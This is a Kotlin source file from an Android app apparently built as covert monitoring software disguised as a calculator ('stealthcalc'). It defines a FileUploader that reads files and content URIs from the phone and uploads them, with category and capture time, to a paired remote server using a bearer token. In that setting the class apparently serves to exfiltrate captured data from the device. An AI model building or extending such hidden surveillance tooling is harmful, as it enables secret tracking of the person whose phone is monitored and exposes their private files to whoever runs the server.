package com.stealthcalc.monitoring.network

import android.content.Context
import android.net.Uri
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.request.bearerAuth
import io.ktor.client.request.forms.formData
import io.ktor.client.request.forms.submitFormWithBinaryData
import io.ktor.client.statement.bodyAsText
import io.ktor.http.Headers
import io.ktor.http.HttpHeaders
import io.ktor.http.isSuccess
import java.io.InputStream
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FileUploader @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private val client: HttpClient by lazy { HttpClient(OkHttp) }
    private val baseUrl: String get() = repository.serverUrl.trimEnd('/')

    suspend fun uploadUri(
        uri: Uri,
        fileName: String,
        mimeType: String,
        category: String,
        capturedAt: Long? = null,
    ): Boolean {
        if (baseUrl.isBlank() || !repository.isPaired) return false

        return runCatching {
            val inputStream: InputStream = context.contentResolver.openInputStream(uri) ?: return false
            val bytes = inputStream.use { it.readBytes() }

            val response = client.submitFormWithBinaryData(
                url = "$baseUrl/files/upload",
                formData = formData {
                    append("fileName", fileName)
                    append("mimeType", mimeType)
                    append("category", category)
                    capturedAt?.let { append("capturedAt", it.toString()) }
                    append("file", bytes, Headers.build {
                        append(HttpHeaders.ContentDisposition, "filename=\"$fileName\"")
                        append(HttpHeaders.ContentType, mimeType)
                    })
                }
            ) {
                bearerAuth(repository.authToken)
            }

            response.status.isSuccess()
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "File upload failed ($fileName): ${e.message}")
        }.getOrDefault(false)
    }

    suspend fun uploadFile(
        file: java.io.File,
        mimeType: String,
        category: String,
        capturedAt: Long? = null,
    ): Boolean {
        if (baseUrl.isBlank() || !repository.isPaired) return false
        if (!file.exists()) return false

        return runCatching {
            val bytes = file.readBytes()
            val response = client.submitFormWithBinaryData(
                url = "$baseUrl/files/upload",
                formData = formData {
                    append("fileName", file.name)
                    append("mimeType", mimeType)
                    append("category", category)
                    capturedAt?.let { append("capturedAt", it.toString()) }
                    append("file", bytes, Headers.build {
                        append(HttpHeaders.ContentDisposition, "filename=\"${file.name}\"")
                        append(HttpHeaders.ContentType, mimeType)
                    })
                }
            ) {
                bearerAuth(repository.authToken)
            }

            response.status.isSuccess()
        }.onFailure { e ->
            AppLogger.log(context, "[agent]", "File upload failed (${file.name}): ${e.message}")
        }.getOrDefault(false)
    }
}
